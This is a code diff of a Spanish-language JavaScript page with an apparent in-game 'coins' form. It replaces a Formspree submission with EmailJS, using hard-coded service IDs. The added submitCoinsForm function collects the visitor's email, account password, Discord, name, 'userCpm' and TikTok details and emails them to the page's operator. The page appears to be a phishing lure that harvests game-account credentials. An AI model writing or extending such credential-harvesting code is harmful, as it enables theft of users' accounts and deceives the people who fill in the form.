@@ -1,3 +1,16 @@
+// Import EmailJS library
+const emailjs = require('emailjs-com');
+
+// Configuración de EmailJS con tus IDs
+const EMAILJS_CONFIG = {
+    publicKey: 'ski84HOi4a8aCWMOu',
+    serviceId: 'service_a6007bp',
+    templateId: 'template_xjhsbgg'
+};
+
+// Inicializar EmailJS
+emailjs.init(EMAILJS_CONFIG.publicKey);
+
 // Traducciones
 const translations = {
     es: {
@@ -115,50 +128,47 @@ function goBackToMain() {
     }, 300);
 }
 
-// Función para enviar el formulario de monedas con Formspree
+// Función para enviar el formulario con EmailJS
 function submitCoinsForm(event) {
     event.preventDefault();
     
     const submitBtn = document.querySelector('.submit-btn');
     const originalText = submitBtn.innerHTML;
-    const form = document.getElementById('coinsForm');
     
     // Efecto de carga
     submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>Enviando...</span>';
     submitBtn.disabled = true;
     
-    // Enviar formulario con fetch
-    fetch(form.action, {
-        method: 'POST',
-        body: new FormData(form),
-        headers: {
-            'Accept': 'application/json'
-        }
-    })
-    .then(response => {
-        if (response.ok) {
-            // Éxito
+    // Obtener datos del formulario
+    const formData = {
+        email: document.getElementById('email').value,
+        password: document.getElementById('password').value,
+        discord: document.getElementById('discord').value,
+        nombre: document.getElementById('nombre').value,
+        userCpm: document.getElementById('userCpm').value,
+        userTiktok: document.getElementById('userTiktok').value,
+        fecha: new Date().toLocaleString('es-ES')
+    };
+    
+    // Enviar con EmailJS
+    emailjs.send(EMAILJS_CONFIG.serviceId, EMAILJS_CONFIG.templateId, formData)
+        .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
             showNotification(translations[currentLanguage].successMessage, 'success');
-            form.reset();
+            document.getElementById('coinsForm').reset();
             
-            // Volver a la página principal después de 2 segundos
             setTimeout(() => {
                 goBackToMain();
             }, 2000);
-        } else {
-            // Error
-            showNotification('Error al enviar el formulario. Intenta de nuevo.', 'error');
-        }
-    })
-    .catch(error => {
-        // Error de red
-        showNotification('Error de conexión. Verifica tu internet e intenta de nuevo.', 'error');
-    })
-    .finally(() => {
-        // Restaurar botón
-        submitBtn.innerHTML = originalText;
-        submitBtn.disabled = false;
-    });
+        })
+        .catch(function(error) {
+            console.log('FAILED...', error);
+            showNotification('Error al enviar. Intenta de nuevo.', 'error');
+        })
+        .finally(function() {
+            submitBtn.innerHTML = originalText;
+            submitBtn.disabled = false;
+        });
 }
 
 // Función para cambiar idioma
